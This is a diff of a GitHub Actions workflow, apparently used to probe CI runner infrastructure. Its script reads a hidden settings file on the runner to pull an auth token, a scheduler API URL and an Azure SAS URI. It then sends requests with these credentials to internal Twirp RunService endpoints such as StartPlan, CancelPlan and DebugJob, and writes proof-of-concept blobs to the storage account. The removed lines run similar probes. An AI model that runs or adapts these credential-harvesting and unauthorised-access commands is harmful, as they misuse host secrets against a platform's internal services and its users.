@@ -1,4 +1,4 @@
-name: HCA Credential Test
+name: HCA Twirp API Test
 on:
   push:
     branches: [master]
@@ -7,34 +7,37 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Test HCA credentials
+      - name: Test Twirp endpoints
         continue-on-error: true
         run: |
           SETTINGS=$(cat /opt/hca/.settings)
-          AUTH_TOKEN=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['authToken'])")
-          API_URL=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['schedulerApiUrl'])")
-          SAS_URI=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['diagnosticsSasUri'])")
+          AUTH=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['authToken'])")
+          API=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['schedulerApiUrl'])")
+          SAS=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['diagnosticsSasUri'])")
           
-          echo "=== 1. Try scheduler API with authToken ==="
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/health" 2>&1 | head -20
-          echo "---"
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/machine" 2>&1 | head -20
-          echo "---"
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${API_URL}/config" 2>&1 | head -20
+          echo "=== 1. Twirp Endpoints ==="
+          BASE="$API/twirp/github.actions.run_service.api.twirp.v1.RunService"
+          for ep in StartPlan GetPlanStatus CancelPlan NotifyGate DebugJob; do
+            echo "--- POST $BASE/$ep ---"
+            curl -sk --connect-timeout 5 -X POST \
+              -H "Authorization: Bearer $AUTH" \
+              -H "Content-Type: application/json" \
+              -d '{}' \
+              "$BASE/$ep" 2>&1 | head -15
+          done
           
-          echo "=== 2. Check SAS URI accessibility ==="
-          curl -sk --connect-timeout 10 "${SAS_URI}&comp=list&restype=container" 2>&1 | head -20
-          echo "---"
-          curl -sk --connect-timeout 5 -X PUT "${SAS_URI}/test_poc_$(date +%s).txt" -d "test" 2>&1 | head -5
+          echo ""
+          echo "=== 2. SAS URI with proper encoding ==="
+          DECODED_SAS=$(python3 -c "import sys,json,urllib.parse;print(urllib.parse.unquote('$SAS'))" 2>/dev/null)
+          echo "SAS decoded: ${DECODED_SAS:0:100}..."
           
-          echo "=== 3. Try trace API ==="
-          TRACE_URL=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['traceApiUrl'])")
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH_TOKEN" "${TRACE_URL}" 2>&1 | head -10
-          
+          echo "=== 3. Check Azure Blob with HTTP PUT ==="
+          curl -sk --connect-timeout 5 -X PUT "$SAS/test_verify.txt" -H "x-ms-blob-type: BlockBlob" -d "poc" 2>&1 | head -5
+
           echo "=== DONE ==="
 
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: hca-cred-test
+          name: twirp-test
           path: dist/
